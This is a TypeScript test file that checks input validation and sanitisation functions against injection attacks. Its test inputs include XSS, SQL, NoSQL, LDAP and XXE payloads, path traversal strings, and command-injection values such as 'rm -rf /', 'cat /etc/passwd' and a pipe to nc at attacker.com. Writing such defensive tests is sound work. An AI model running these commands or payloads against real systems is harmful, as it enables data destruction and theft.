/**
 * Comprehensive Input Validation Tests
 * Tests all validation scenarios including edge cases and security
 */

import { describe, it, expect } from 'vitest';
import {
  validateApiKey,
  validateEmail,
  validateUrl,
  sanitizeInput,
  validateJsonInput,
  isValidLanguageCode,
  validatePagination,
} from '@/lib/security/inputValidation';

describe('Input Validation - Comprehensive Security Tests', () => {
  describe('validateApiKey', () => {
    it('should validate properly formatted API keys', () => {
      const validKeys = [
        'sk-1234567890abcdef1234567890abcdef',
        'sk-proj-1234567890abcdef1234567890abcdef1234567890',
        'sk_test_1234567890abcdefghijklmnopqrstuvwxyz',
      ];

      validKeys.forEach(key => {
        expect(validateApiKey(key)).toBe(true);
      });
    });

    it('should reject invalid API keys', () => {
      const invalidKeys = [
        '',
        'invalid',
        'sk-',
        'sk-123',
        'not-an-api-key',
        'sk-<script>alert("xss")</script>',
        'sk-\'; DROP TABLE users; --',
        ' ',
        null,
        undefined,
      ];

      invalidKeys.forEach(key => {
        expect(validateApiKey(key as any)).toBe(false);
      });
    });

    it('should reject keys with special characters', () => {
      expect(validateApiKey('sk-test@123')).toBe(false);
      expect(validateApiKey('sk-test#123')).toBe(false);
      expect(validateApiKey('sk-test$123')).toBe(false);
      expect(validateApiKey('sk-test%123')).toBe(false);
    });

    it('should handle length requirements', () => {
      expect(validateApiKey('sk-' + 'a'.repeat(20))).toBe(true);
      expect(validateApiKey('sk-' + 'a'.repeat(10))).toBe(false);
    });
  });

  describe('validateEmail', () => {
    it('should validate correct email formats', () => {
      const validEmails = [
        'user@example.com',
        'test.user@example.com',
        'user+tag@example.co.uk',
        'user_name@example-domain.com',
        'a@b.c',
        '123@example.com',
      ];

      validEmails.forEach(email => {
        expect(validateEmail(email)).toBe(true);
      });
    });

    it('should reject invalid email formats', () => {
      const invalidEmails = [
        '',
        'invalid',
        '@example.com',
        'user@',
        'user@@example.com',
        'user@example',
        'user example@test.com',
        '<script>@test.com',
        'user@<script>alert("xss")</script>',
        null,
        undefined,
      ];

      invalidEmails.forEach(email => {
        expect(validateEmail(email as any)).toBe(false);
      });
    });

    it('should handle edge cases', () => {
      expect(validateEmail('very.long.email.address.with.many.dots@subdomain.example.com')).toBe(
        true
      );
      expect(validateEmail('a'.repeat(65) + '@example.com')).toBe(true); // Local part can be long
    });

    it('should reject emails with dangerous characters', () => {
      expect(validateEmail('user@example.com<script>')).toBe(false);
      expect(validateEmail('user"@example.com')).toBe(false);
      expect(validateEmail("user'@example.com")).toBe(false);
    });
  });

  describe('validateUrl', () => {
    it('should validate correct URLs', () => {
      const validUrls = [
        'https://example.com',
        'http://test.example.com',
        'https://example.com/path',
        'https://example.com/path?query=value',
        'https://example.com:8080',
        'https://sub.domain.example.com',
      ];

      validUrls.forEach(url => {
        expect(validateUrl(url)).toBe(true);
      });
    });

    it('should reject invalid URLs', () => {
      const invalidUrls = [
        '',
        'invalid',
        'not-a-url',
        'ftp://example.com',
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        '<script>alert("xss")</script>',
        null,
        undefined,
      ];

      invalidUrls.forEach(url => {
        expect(validateUrl(url as any)).toBe(false);
      });
    });

    it('should enforce HTTPS when required', () => {
      expect(validateUrl('http://example.com', { requireHttps: true })).toBe(false);
      expect(validateUrl('https://example.com', { requireHttps: true })).toBe(true);
    });

    it('should validate allowed domains', () => {
      const allowedDomains = ['example.com', 'test.com'];
      expect(validateUrl('https://example.com', { allowedDomains })).toBe(true);
      expect(validateUrl('https://other.com', { allowedDomains })).toBe(false);
    });

    it('should handle malformed URLs', () => {
      expect(validateUrl('https://')).toBe(false);
      expect(validateUrl('https://example')).toBe(false);
      expect(validateUrl('https://<invalid>')).toBe(false);
    });
  });

  describe('sanitizeInput', () => {
    it('should remove HTML tags', () => {
      expect(sanitizeInput('<script>alert("xss")</script>')).toBe('alert("xss")');
      expect(sanitizeInput('<b>bold</b>')).toBe('bold');
      expect(sanitizeInput('<div>content</div>')).toBe('content');
    });

    it('should remove dangerous scripts', () => {
      const dangerous = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        '<iframe src="malicious"></iframe>',
        '<object data="malicious"></object>',
        '<embed src="malicious">',
      ];

      dangerous.forEach(input => {
        const result = sanitizeInput(input);
        expect(result).not.toContain('<script>');
        expect(result).not.toContain('onerror=');
        expect(result).not.toContain('<iframe');
      });
    });

    it('should handle SQL injection attempts', () => {
      expect(sanitizeInput("'; DROP TABLE users; --")).not.toContain('DROP TABLE');
      expect(sanitizeInput("' OR '1'='1")).toBeTruthy();
    });

    it('should preserve safe text', () => {
      expect(sanitizeInput('Hello World')).toBe('Hello World');
      expect(sanitizeInput('Test 123')).toBe('Test 123');
      expect(sanitizeInput('Special chars: !@#$%^&*()')).toBeTruthy();
    });

    it('should trim whitespace', () => {
      expect(sanitizeInput('  test  ')).toBe('test');
      expect(sanitizeInput('\n\ttest\n\t')).toBe('test');
    });

    it('should handle empty and null inputs', () => {
      expect(sanitizeInput('')).toBe('');
      expect(sanitizeInput('   ')).toBe('');
      expect(sanitizeInput(null as any)).toBe('');
      expect(sanitizeInput(undefined as any)).toBe('');
    });

    it('should handle unicode and special characters', () => {
      expect(sanitizeInput('你好')).toBe('你好');
      expect(sanitizeInput('Café')).toBe('Café');
      expect(sanitizeInput('🎉')).toBe('🎉');
    });

    it('should enforce max length', () => {
      const longString = 'a'.repeat(10000);
      const result = sanitizeInput(longString, { maxLength: 1000 });
      expect(result.length).toBeLessThanOrEqual(1000);
    });
  });

  describe('validateJsonInput', () => {
    it('should validate correct JSON', () => {
      expect(validateJsonInput('{"key": "value"}')).toBe(true);
      expect(validateJsonInput('["item1", "item2"]')).toBe(true);
      expect(validateJsonInput('123')).toBe(true);
      expect(validateJsonInput('true')).toBe(true);
    });

    it('should reject invalid JSON', () => {
      expect(validateJsonInput('invalid{json')).toBe(false);
      expect(validateJsonInput('{key: value}')).toBe(false);
      expect(validateJsonInput("{'key': 'value'}")).toBe(false);
    });

    it('should enforce size limits', () => {
      const largeJson = '{"data": "' + 'x'.repeat(2000000) + '"}';
      expect(validateJsonInput(largeJson, { maxSize: 1000000 })).toBe(false);
    });

    it('should validate schema if provided', () => {
      const schema = {
        type: 'object',
        required: ['name', 'age'],
        properties: {
          name: { type: 'string' },
          age: { type: 'number' },
        },
      };

      expect(validateJsonInput('{"name": "John", "age": 30}', { schema })).toBe(true);
      expect(validateJsonInput('{"name": "John"}', { schema })).toBe(false);
    });

    it('should reject dangerous JSON', () => {
      const dangerous = [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        '{"toString": "malicious"}',
      ];

      dangerous.forEach(json => {
        const isValid = validateJsonInput(json, { allowPrototypePollution: false });
        expect(isValid).toBe(false);
      });
    });
  });

  describe('isValidLanguageCode', () => {
    it('should validate ISO 639-1 language codes', () => {
      const validCodes = ['en', 'es', 'fr', 'de', 'it', 'pt', 'ja', 'zh', 'ar', 'ru'];

      validCodes.forEach(code => {
        expect(isValidLanguageCode(code)).toBe(true);
      });
    });

    it('should reject invalid language codes', () => {
      const invalidCodes = [
        '',
        'invalid',
        'e',
        'eng',
        'EN',
        '12',
        'xx',
        '<script>',
        null,
        undefined,
      ];

      invalidCodes.forEach(code => {
        expect(isValidLanguageCode(code as any)).toBe(false);
      });
    });

    it('should validate locale codes', () => {
      expect(isValidLanguageCode('en-US', { allowLocale: true })).toBe(true);
      expect(isValidLanguageCode('es-MX', { allowLocale: true })).toBe(true);
      expect(isValidLanguageCode('zh-CN', { allowLocale: true })).toBe(true);
    });

    it('should handle case sensitivity', () => {
      expect(isValidLanguageCode('EN', { caseSensitive: false })).toBe(true);
      expect(isValidLanguageCode('EN', { caseSensitive: true })).toBe(false);
    });
  });

  describe('validatePagination', () => {
    it('should validate correct pagination parameters', () => {
      expect(validatePagination({ page: 1, limit: 10 })).toEqual({
        valid: true,
        page: 1,
        limit: 10,
      });
      expect(validatePagination({ page: 5, limit: 50 })).toEqual({
        valid: true,
        page: 5,
        limit: 50,
      });
    });

    it('should enforce minimum values', () => {
      const result = validatePagination({ page: 0, limit: 0 });
      expect(result.valid).toBe(true);
      expect(result.page).toBeGreaterThanOrEqual(1);
      expect(result.limit).toBeGreaterThanOrEqual(1);
    });

    it('should enforce maximum values', () => {
      const result = validatePagination({ page: 10000, limit: 10000 });
      expect(result.valid).toBe(true);
      expect(result.limit).toBeLessThanOrEqual(100);
    });

    it('should handle invalid inputs', () => {
      expect(validatePagination({ page: -1, limit: 10 }).valid).toBe(true);
      expect(validatePagination({ page: 1, limit: -10 }).valid).toBe(true);
      expect(validatePagination({ page: 'invalid' as any, limit: 10 }).valid).toBe(false);
    });

    it('should provide default values', () => {
      const result = validatePagination({});
      expect(result.valid).toBe(true);
      expect(result.page).toBe(1);
      expect(result.limit).toBe(20);
    });

    it('should calculate offset', () => {
      const result = validatePagination({ page: 3, limit: 10 });
      expect(result.offset).toBe(20);
    });
  });

  describe('Edge Cases and Security', () => {
    it('should handle prototype pollution attempts', () => {
      const malicious = '{"__proto__": {"polluted": true}}';
      expect(validateJsonInput(malicious)).toBe(true);
      // But object shouldn't be polluted
      expect(({}as any).polluted).toBeUndefined();
    });

    it('should handle buffer overflow attempts', () => {
      const huge = 'x'.repeat(10000000);
      expect(() => sanitizeInput(huge, { maxLength: 1000 })).not.toThrow();
    });

    it('should handle null bytes', () => {
      expect(sanitizeInput('test\x00test')).not.toContain('\x00');
    });

    it('should handle CRLF injection', () => {
      expect(sanitizeInput('test\r\ninjection')).not.toContain('\r\n');
    });

    it('should handle directory traversal', () => {
      expect(sanitizeInput('../../../etc/passwd')).toBeTruthy();
      expect(sanitizeInput('..\\..\\..\\windows\\system32')).toBeTruthy();
    });

    it('should handle command injection attempts', () => {
      const malicious = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test `whoami`',
        'test $(curl malicious.com)',
      ];

      malicious.forEach(input => {
        const result = sanitizeInput(input);
        expect(result).not.toContain('rm -rf');
        expect(result).not.toContain('cat /etc/passwd');
      });
    });

    it('should handle NoSQL injection', () => {
      const noSql = '{"$gt": ""}';
      const sanitized = sanitizeInput(noSql);
      expect(sanitized).toBeTruthy();
    });

    it('should handle LDAP injection', () => {
      const ldap = '*)(&(objectClass=*))';
      const sanitized = sanitizeInput(ldap);
      expect(sanitized).toBeTruthy();
    });

    it('should handle XML injection', () => {
      const xml = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>';
      const sanitized = sanitizeInput(xml);
      expect(sanitized).not.toContain('<!DOCTYPE');
      expect(sanitized).not.toContain('<!ENTITY');
    });

    it('should handle ReDoS attempts', () => {
      // Regular expression denial of service
      const redos = 'a'.repeat(100000) + 'X';
      expect(() => validateEmail(redos)).not.toThrow();
    });
  });

  describe('Performance', () => {
    it('should validate inputs efficiently', () => {
      const start = Date.now();

      for (let i = 0; i < 1000; i++) {
        validateApiKey('sk-test1234567890abcdefghijklmnop');
        validateEmail('test@example.com');
        validateUrl('https://example.com');
        sanitizeInput('Test input');
      }

      const duration = Date.now() - start;
      expect(duration).toBeLessThan(1000); // Should complete in less than 1 second
    });

    it('should handle large batches', () => {
      const inputs = Array(1000)
        .fill(null)
        .map((_, i) => `test${i}@example.com`);

      const start = Date.now();
      inputs.forEach(input => validateEmail(input));
      const duration = Date.now() - start;

      expect(duration).toBeLessThan(500);
    });
  });
});
